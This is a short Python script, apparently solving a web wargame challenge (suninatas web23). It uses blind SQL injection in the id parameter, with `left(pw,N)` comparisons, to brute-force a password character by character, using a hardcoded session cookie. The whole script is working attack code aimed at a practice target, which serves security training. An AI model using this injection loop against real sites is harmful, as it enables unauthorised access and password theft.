# -*- coding: utf-8 -*- 
import requests 
# url
url = "http://suninatas.com/challenge/web23/web23.asp"
 
cookie = {"ASPSESSIONIDCSSCCCBB" : "KPFDBEICFONODJOEKNGCGIDL"}
wordlist = "abcdefghijklmnopqrstuvwxyz1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ<>?!@#$%^&*()_+"
result  = "v"
 
 
for i in range(1, 12):
    print('#'+str(i+1))
    for k in range(0, len(wordlist)):
        query = "'or(left(pw,"+str(i+1)+")='"+result+wordlist[k]+"')--" #20+(result+1)
        print(query)
        response = requests.get(url, params={'id': query, 'pw': 'qwerty'}, cookies=cookie)
        
        if "OK" in response.text:
            result += wordlist[k]
            print(result)
            break
 
print("[!]" + " 최종 비밀번호는 " + result + "입니다.")